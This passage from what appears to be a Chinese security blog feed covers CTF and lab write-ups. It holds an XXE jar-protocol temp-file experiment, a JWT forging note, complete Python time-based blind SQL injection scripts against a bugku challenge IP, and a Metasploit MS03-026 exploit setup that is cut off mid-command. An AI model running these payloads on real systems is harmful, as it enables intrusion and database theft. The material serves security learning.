class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure></div><p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p><p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p><blockquote><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p></blockquote><p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">jar:</span><span class="string">http:</span><span class="comment">//localhost:9999/jar.zip!/1.php</span></span><br></pre></td></tr></table></figure></div><p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p><p><strong>如下图：</strong></p><p><img src="https://i.imgur.com/u3U1EPq.png" alt=""></p><p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p><p><strong>下面是我的实验录屏：</strong></p><img src="https://i.imgur.com/8WMGQfV.gif"><p>实验就到这一步了，怎么利用就看各位大佬的了.</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>几个实验都是Korz3n大佬那拿来的</p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/6681114.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/6681114.html</a></p><p><a href="https://m3lon.github.io/2019/01/20/xxe实验踩坑记录/" target="_blank" rel="noopener">https://m3lon.github.io/2019/01/20/xxe%E5%AE%9E%E9%AA%8C%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</a></p><p><a href="https://www.jianshu.com/p/77f2181587a4" target="_blank" rel="noopener">https://www.jianshu.com/p/77f2181587a4</a></p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ISCC | 未知的风险-1</title>
      <link>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</link>
      <guid>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</guid>
      <pubDate>Thu, 14 May 2020 23:50:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;img src=&quot;https://i.imgur.com/p3MffHP.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;进入题目：   &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/BCfxRDa.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;题目提示u
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p><img src="https://i.imgur.com/p3MffHP.png" alt=""></p><p>进入题目：   </p><p><img src="https://i.imgur.com/BCfxRDa.png" alt=""></p><p>题目提示user才能进去，抓包得到token       </p><p><img src="https://i.imgur.com/nJHyhmu.png" alt="">     </p><p>然后暴力破解token得到密钥进行伪造token            </p><p>攻击JWT的一些方法：       </p><p><a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>bugku | insert into</title>
      <link>http://yoursite.com/undefined/[bugku]insert%20into/</link>
      <guid>http://yoursite.com/undefined/[bugku]insert%20into/</guid>
      <pubDate>Wed, 13 May 2020 03:12:12 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;这道题我觉得还是主要考了编写脚本的能力  &lt;/p&gt;
&lt;h4 id=&quot;题目描述：&quot;&gt;&lt;a href=&quot;#题目描述：&quot; class=&quot;headerlink&quot; title=&quot;题目描述：&quot;&gt;&lt;/a&gt;题目描述：&lt;/h4&gt;&lt;p&gt;flag格式：flag{xxxxxxxxxxxx}   &lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>这道题我觉得还是主要考了编写脚本的能力  </p><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>flag格式：flag{xxxxxxxxxxxx}   </p><p>不如写个Python吧    </p><h4 id="题目直接给出了源码，那就很简单了"><a href="#题目直接给出了源码，那就很简单了" class="headerlink" title="题目直接给出了源码，那就很简单了"></a>题目直接给出了源码，那就很简单了</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></div><p>简单分析可以看出服务器读取http头部x-forwarded-for作为ip地址，在将其传给$ip之前，以  ， 为分割符进行分割并取结果数组的第一项。相当于过滤了逗号     </p><p>因为error_reporting(0);关闭了错误报告，没有有效回显，所以使用sleep()时间盲注。    </p><p>构造payload：       </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LSL"><figure class="iseeu highlight /lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'+sleep(<span class="number">5</span>)+'</span><br></pre></td></tr></table></figure></div><p>这道题过滤了 ， 所以脚本如下：</p><p>查库查表</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">dic= string.ascii_letters + string.digits + string.punctuation    #猜解数据库名称的payload</span><br><span class="line"><span class="comment">#string.ascii_leters生成所有字母A-Z,a-z.</span></span><br><span class="line"><span class="comment">#string.ascii_digits生成所有数字0-9</span></span><br><span class="line"><span class="comment">#string.punctuation生成所有标点字符  '!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span></span><br><span class="line">payload_db = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end)+'"</span> #查询当前数据库名</span><br><span class="line">payload_tb_num = <span class="string">"1'+(select case when (select count(*) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;')='&#123;1&#125;' then sleep(5) else 1 end)+'1"</span> #查询数据库表总数</span><br><span class="line">payload_tb_name_len = <span class="string">"1'+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) = '&#123;2&#125;' then sleep(5) else 1 end)+'1"</span>#查询数据表长度</span><br><span class="line">payload_tb_name = <span class="string">"1'+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) from &#123;2&#125; for 1)) = '&#123;3&#125;' then sleep(5) else 1 end)+'1"</span>#查询数据表名</span><br><span class="line">payload_col_num = <span class="string">"1'+(select case when (select count(*) from  ))"</span></span><br><span class="line"><span class="comment">#查当前数据库</span></span><br><span class="line">db_name = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,6):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_db.format(i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:  #服务器在指定时间内没有应答</span><br><span class="line">            <span class="builtin-name">print</span>(payload_db.format(i,j))</span><br><span class="line">            db_name += j</span><br><span class="line">            break</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'db_name: '</span> + db_name)</span><br><span class="line"><span class="comment">#查当前数据库有几张表</span></span><br><span class="line">tb_num = 0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_num.format(db_name,str(i))&#125;</span><br><span class="line">        res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=4)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        tb_num = i</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'tb_num: '</span>+str(i))</span><br><span class="line">        break</span><br><span class="line"><span class="comment">#运行后可知有两个表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名破解</span></span><br><span class="line">len = 0</span><br><span class="line"><span class="comment">#爆破表的长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(tb_num):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(50):</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name_len.format(db_name,i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            break</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'No.'</span>+str(i+1)+<span class="string">' table has length: '</span> + str(len))</span><br><span class="line">    #爆破 表名</span><br><span class="line">    tb_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(1,len + 1):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name.format(db_name,i,k,j)&#125;</span><br><span class="line">                res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">            except requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="builtin-name">print</span>(payload_tb_name.format(db_name,i,k,j))</span><br><span class="line">                tb_name += j</span><br><span class="line">                break</span><br><span class="line">        <span class="builtin-name">print</span>(tb_name)</span><br><span class="line"><span class="comment">#运行后可知两个表为flag和client_ip</span></span><br></pre></td></tr></table></figure></div><p>查字段：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#数据库</span></span><br><span class="line">db_name='web15'</span><br><span class="line"><span class="comment">#数据表</span></span><br><span class="line">tb_name='flag'</span><br><span class="line">url = "http://123.206.87.240:8002/web15/"</span><br><span class="line">payload_col_num = "1'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span>)=&#123;<span class="number">2</span>&#125; <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)+<span class="string">'" #爆字段数</span></span><br><span class="line"><span class="string">payload_col_len = "1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="keyword">length</span>(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> &#123;<span class="number">2</span>&#125;) = <span class="string">'&#123;3&#125;'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">6</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)+<span class="string">'"</span></span><br><span class="line"><span class="string">payload_col_name = "1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> &#123;<span class="number">2</span>&#125;) <span class="keyword">from</span> &#123;<span class="number">3</span>&#125; <span class="keyword">for</span> <span class="number">1</span>)) = <span class="string">'&#123;4&#125;'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">6</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)+<span class="string">'"</span></span><br><span class="line"><span class="string">dic='</span><span class="number">0123456789</span>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;<span class="string">'</span></span><br><span class="line"><span class="string">#查flag表字段数</span></span><br><span class="line"><span class="string">col_num = 0</span></span><br><span class="line"><span class="string">for a in range(1,10):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">':payload_col_num.format(db_name,tb_name,a)&#125;</span></span><br><span class="line"><span class="string">        res = requests.get(url,headers=headers,timeout=5)</span></span><br><span class="line"><span class="string">    except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">        col_num  = a</span></span><br><span class="line"><span class="string">        print ('</span>flag表<span class="string">'+"字段总数为"+str(col_num))</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">#查flag表字段长度</span></span><br><span class="line"><span class="string">col_len = 0</span></span><br><span class="line"><span class="string">col_name=''</span></span><br><span class="line"><span class="string">for b in range(col_num):</span></span><br><span class="line"><span class="string">    for c in range(50):</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">':payload_col_len.format(db_name,tb_name,b,c)&#125;</span></span><br><span class="line"><span class="string">            res = requests.get(url,headers=headers,timeout=5)</span></span><br><span class="line"><span class="string">        except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">            col_len = c</span></span><br><span class="line"><span class="string">            print('</span>No.<span class="string">' + str(b + 1) + '</span> <span class="keyword">column</span> has <span class="keyword">length</span>: <span class="string">' + str(col_len))</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">#查字段名</span></span><br><span class="line"><span class="string">    for d in range(1, col_len + 1):</span></span><br><span class="line"><span class="string">        for e in dic:</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">                headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">': payload_col_name.format(db_name, tb_name, b, d, e)&#125;</span></span><br><span class="line"><span class="string">                res = requests.get(url, headers=headers, timeout=5)</span></span><br><span class="line"><span class="string">            except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">                col_name += e</span></span><br><span class="line"><span class="string">                print("col_name="+col_name)</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">print('</span>col_name: <span class="string">' + col_name)</span></span><br></pre></td></tr></table></figure></div><p>查数据</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">dic</span>=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;'</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="comment">#get content 猜解flag</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">payload_data = <span class="string">"1'+(select case when (substr((select flag from flag) from &#123;0&#125; for 1)) = '&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_data.format(i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            <span class="builtin-name">print</span>(payload_data.format(i,j))</span><br><span class="line">            flag += j</span><br><span class="line">            break</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'data='</span>+str(flag))</span><br></pre></td></tr></table></figure></div><p>得到flag</p><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/[bugku]insert%20into/#disqus_thread</comments>
    </item>
    
    <item>
      <title>MSF--Metasploit Framework渗透测试工具</title>
      <link>http://yoursite.com/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
      <guid>http://yoursite.com/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
      <pubDate>Sat, 09 May 2020 05:48:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;目前最流行、最强大、最具扩展性的渗透测试平台软件    &lt;/p&gt;
&lt;p&gt;2003年由HD More发布第一版，2007年用ruby语言重写，MSF默认集成在Kali Linux之中    &lt;/p&gt;
&lt;p&gt;Kali左侧有MSF的快捷方式，可以直接点击使用，也可以在终端输入ms
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>目前最流行、最强大、最具扩展性的渗透测试平台软件    </p><p>2003年由HD More发布第一版，2007年用ruby语言重写，MSF默认集成在Kali Linux之中    </p><p>Kali左侧有MSF的快捷方式，可以直接点击使用，也可以在终端输入msfconsole启动MSF </p><h2 id="一-名词解释"><a href="#一-名词解释" class="headerlink" title="一.名词解释"></a>一.名词解释</h2><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p>漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。   </p><h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>简单来说，Payload是黑客用来与被黑了的系统交互的简单脚本。使用payload，可以将数据传输到已经沦陷的系统。   </p><p>Metasploit有效载荷可以有三种类型-    </p><ul><li><p>Singles<br>Singles非常小，旨在建立某种通讯，然后进入下一阶段。例如，只是创建一个用户。   </p></li><li><p>Staged<br>是一种攻击者用来将更大的文件上传到沦陷的系统的payload。   </p></li><li><p>Stages<br>Stages是由Stagers模块下载的payload组件。各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNCInjection。    </p></li></ul><h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块     </p><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>让我们举个例子来理解Metasploitpayload的使用。假设我们有一台易受DCOM MS03-026攻击的WindowsServer 2003计算机。</p><p>首先，我们将搜索可以使用此漏洞的exp。我们将使用具有最佳RANK的漏洞利用。 </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">search</span> dcom</span><br><span class="line">~~~   </span><br><span class="line">![](http<span class="variable">s:</span>//i.imgur.<span class="keyword">com</span>/k3zDoiw.png)    </span><br><span class="line"></span><br><span class="line">再选择要使用的<span class="built_in">exp</span></span><br></pre></td></tr></table></figure></div><p>msf5 &gt; use exploit/windows/dcerpc/ms03_026_dcom</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/TBnDynz.png"</span>&gt;  </span><br><span class="line"></span><br><span class="line">然后我们使用下列命令来看看我们可以使用的payload</span><br></pre></td></tr></table></figure></div><p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; show payloads</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/k3zDoiw.png"</span>&gt;   </span><br><span class="line"></span><br><span class="line">看到列出的payload可以能帮助我们上传/执行文件，使沦陷的系统成为vnc服务器（能远程监视）   </span><br><span class="line"> </span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/7q6OI0e.png"</span>&gt;  </span><br><span class="line"></span><br><span class="line">为了设置我们需要的payload，选择一个payload使用下列命令</span><br></pre></td></tr></table></figure></div><p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set PAYLOAD windows/upexec/bind_hidden_tcp</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"https://i.imgur.com/Q3bStZQ.png"</span>&gt;   </span><br><span class="line"></span><br><span class="line">设置监听主机和监听端口(LHOST,LPORT),它们是攻击者的<span class="built_in">IP</span>和端口。然后设置远程主机和端口(RPORT,LHOST),它们是受害者<span class="built_in">IP</span>和端口。</span><br></pre></td></tr></table></figure></div><p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set LHOST 192.168.56.134<br>LHOST =&gt; 192.168.56.134<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set LPORT 23524<br>LPORT =&gt; 23524<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set RPORT 135<br>RPORT =&gt; 135<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set RHOST 